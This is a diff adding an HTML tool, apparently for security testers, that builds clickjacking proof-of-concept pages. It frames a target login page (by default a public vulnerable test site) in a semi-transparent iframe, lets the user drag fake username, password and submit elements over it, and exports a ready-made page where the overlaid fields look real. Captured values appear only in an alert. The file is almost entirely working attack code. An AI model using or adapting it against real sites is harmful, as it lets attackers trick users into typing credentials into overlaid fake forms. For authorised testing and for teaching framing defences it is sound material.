@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<title>PoC ClickJacking 2 komponen input</title>
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+
+<style>
+    iframe {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        z-index: -1;
+        border: none;
+        opacity: 0.5;
+        pointer-events: none;
+        display: block;
+    }
+
+    body {
+        overflow: hidden;
+        margin: 0px;
+        padding: 0px;
+    }
+
+    #target_div {
+        position: absolute;
+        top: 55%;
+        left: 10%;
+        border: 0px;
+        opacity: 1;
+        width: 100px;
+        height: 50px;
+        resize: both;
+        overflow: hidden;
+    }
+
+    #username_div {
+        position: absolute;
+        top: 25%;
+        left: 10%;
+        border: 0px;
+        opacity: 1;
+        width: 150px;
+        height: 30px;
+        resize: both;
+        overflow: hidden;
+    }
+
+    #password_div {
+        position: absolute;
+        top: 35%;
+        left: 10%;
+        border: 0px;
+        opacity: 1;
+        width: 150px;
+        height: 30px;
+        resize: both;
+        overflow: hidden;
+    }
+
+
+
+    #target, #username_input, #password_input {
+        width: 100%;
+        height: 100%;
+        background: red;
+        color: black;
+        opacity: 0.7;
+        border: 0px;
+    }
+
+    #dd_area_target, #dd_area_user, #dd_area_pass{
+        width: 100%;
+        height: 100%;
+        opacity: 0;
+        position: absolute;
+        left: -20px;
+        top: 0px;
+        z-index: 1;
+    }
+
+
+
+    #navbar {
+        background-color: #444;
+        overflow: hidden;
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        color: white;
+        display: block;
+        padding-left: 20px;
+        display: flex;
+        z-index: 2;
+    }
+
+    div input, button {
+        color: #444;
+    }
+
+    .paddme {
+        padding-top: 20px;
+        padding-bottom: 20px;
+        height: 100%;
+    }
+
+    .marginme {
+        margin-bottom: 10px;
+        width: 80%;
+    }
+
+    p {
+        line-height: 200%;
+    }
+
+    input {
+        margin: 1px;
+        padding: 0px;
+        border: 0px;
+    }
+
+    code {
+        display: inline-block;
+        padding-left: 20px;
+        width: 50%;
+        margin-top: 10px;
+    }
+</style>
+
+<script>
+
+document.onreadystatechange = function () {
+    if (document.readyState == "complete") {
+        clickjack();
+        dragElement(document.getElementById("target_div"));
+        dragElement(document.getElementById("username_div"));
+        dragElement(document.getElementById("password_div"));
+    }
+}
+
+var alert_text_var = "";
+
+aus_func = function() {
+    var username = document.getElementById("username_input").value;
+    var password = document.getElementById("password_input").value;
+    alert("Username: " + username + "\nPassword: " + password );
+}
+
+function clickjack() {
+
+    frame_src_text.value = "http://testphp.vulnweb.com/login.php";
+    page.src = frame_src_text.value;
+    page.setAttribute("sandbox", "allow-forms allow-scripts");
+
+    target.setAttribute("onclick", `aus_func()`);
+    dd_area_target.setAttribute("onclick", `aus_func()`);
+
+    document.onkeydown = intercept_keys;
+
+    var adj_w = screen.width / 100;
+    var adj_h = screen.height / 100;
+
+    var alert_export_text = alert_text_var;
+
+    function intercept_keys(e) {
+        var pos_left = target_div.offsetLeft;
+        var pos_top = target_div.offsetTop;
+
+        // Manage navbar toggling
+        if (e.keyCode == 27) {
+            if (navbar.style.display == "none") {
+                navbar.style.display = "flex";
+            }
+            else {
+                navbar.style.display = "none";
+            }
+        }
+
+        if (event.keyCode == 13) {
+            if (page.src != frame_src_text.value) {
+                page.src = frame_src_text.value;
+            }
+
+            if (alert_text_var != alert_text.value) {
+                alert_text_var = alert_text.value;
+                target.setAttribute("onclick", `aus_func()`); // Ensure the onclick is correctly set
+                dd_area_target.setAttribute("onclick", `aus_func()`); // Same for dd_area_target
+            }
+        }
+    }
+}
+
+
+function dragElement(elmnt) {
+    let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+    let isResizing = false;
+
+    elmnt.addEventListener('mousedown', (e) => {
+        if (e.target === elmnt && e.offsetX > elmnt.clientWidth - 10 && e.offsetY > elmnt.clientHeight - 10) {
+            isResizing = true;
+            return;
+        }
+
+        isResizing = false;
+        pos3 = e.clientX;
+        pos4 = e.clientY;
+        document.onmouseup = closeDragElement;
+        document.onmousemove = dragMouseMove;
+    });
+
+    function dragMouseMove(e) {
+        if (isResizing) {
+            elmnt.style.width = `${elmnt.offsetWidth + (e.clientX - pos3)}px`;
+            elmnt.style.height = `${elmnt.offsetHeight + (e.clientY - pos4)}px`;
+            pos3 = e.clientX;
+            pos4 = e.clientY;
+        } else {
+            e.preventDefault();
+            pos1 = pos3 - e.clientX;
+            pos2 = pos4 - e.clientY;
+            pos3 = e.clientX;
+            pos4 = e.clientY;
+            elmnt.style.top = `${elmnt.offsetTop - pos2}px`;
+            elmnt.style.left = `${elmnt.offsetLeft - pos1}px`;
+        }
+    }
+
+    function closeDragElement() {
+        document.onmouseup = null;
+        document.onmousemove = null;
+    }
+}
+
+function export_poc() {
+    var orig_content = document.documentElement.innerHTML;
+    var dom_copy = _create_dom_clone(orig_content);
+
+    var target_cloned = dom_copy.getElementById("target");
+    target_cloned.style.opacity = "0%";
+
+    var username_cloned = dom_copy.getElementById("username_input");
+    username_cloned.style.opacity = "100%";
+    username_cloned.style.backgroundColor = "white";
+    username_cloned.style.color = "black";
+
+    var password_cloned = dom_copy.getElementById("password_input");
+    password_cloned.style.opacity = "100%";
+    password_cloned.style.backgroundColor = "white";
+    password_cloned.style.color = "black";
+
+    var frame_cloned = dom_copy.getElementById("page");
+    frame_cloned.style.opacity = "100%";
+    frame_cloned.style['pointer-events'] = "auto";
+
+    dom_copy.getElementById("navbar").remove();
+    dom_copy.getElementById("dd_area_target").remove();
+    dom_copy.getElementById("dd_area_user").remove();
+    dom_copy.getElementById("dd_area_pass").remove();
+    dom_copy.getElementById("target_div").style.resize = "none";
+    dom_copy.getElementById("username_div").style.resize = "none";
+    dom_copy.getElementById("password_div").style.resize = "none";
+
+    dom_copy.getElementById("target_div").onclick = null;
+    dom_copy.getElementById("username_div").onclick = null;
+    dom_copy.getElementById("password_div").onclick = null;
+
+    dom_copy.getElementById("target").setAttribute("onclick", `aus_func()`);
+
+    var bl = new File([dom_copy.documentElement.innerHTML], {type: "text/html"});
+    var a = document.createElement("a");
+    a.href = URL.createObjectURL(bl);
+    a.download = "PoC_ClickJacking.html";
+    a.hidden = true;
+    document.body.appendChild(a);
+    a.click();
+}
+
+function _create_dom_clone(htmlcode) {
+    var doc = document.implementation.createHTMLDocument('PoC ClickJacking 2 komponen input');
+    doc.documentElement.innerHTML = htmlcode;
+    return doc;
+}
+</script>
+
+
+</head>
+
+<body>
+<iframe id="page" frameBorder="0"></iframe>
+
+<!-- Draggable and resizable tombol submit -->
+<div id="target_div">
+    <div id="dd_area_target"></div>
+    <button type="button" id="target"  onclick="">Tombol Submit</button>
+</div>
+
+<!-- Draggable and resizable username input -->
+<div id="username_div">
+    <div id="dd_area_user"></div>
+    <input type="text" id="username_input" placeholder="Username" />
+</div>
+
+<!-- Draggable and resizable password input -->
+<div id="password_div">
+    <div id="dd_area_pass"></div>
+    <input type="password" id="password_input" placeholder="Password" />
+</div>
+
+
+<div id="navbar" class="container-fluid">
+    <div class="row" style="width: 100%;">
+        <div class="col-md-2">
+            <h3>Control panel:  </h3>
+        </div>
+
+        <div class="col-md-4">
+            <p>
+                Tekan tombol <kbd>esc</kbd> untuk hide/unhide navbar.<br>
+                Tekan tombol <kbd>enter</kbd> untuk update input data URL Target.<br>
+                Gunakan <kbd>mouse</kbd> untuk move/resize komponen ClickJacking
+            </p>
+        </div>
+
+        <div class="col-md-5">
+            <div class="input-group">
+                <span class="input-group-addon">URL Target</span>
+                <input type="text" class="form-control" id="frame_src_text" >
+            </div>
+        </div>
+
+        <div class="col-md-1">
+            <p>
+                Export PoC: <br>
+                <button class="btn btn-success" onclick="export_poc()">Submit PoC</button>
+            </p>
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
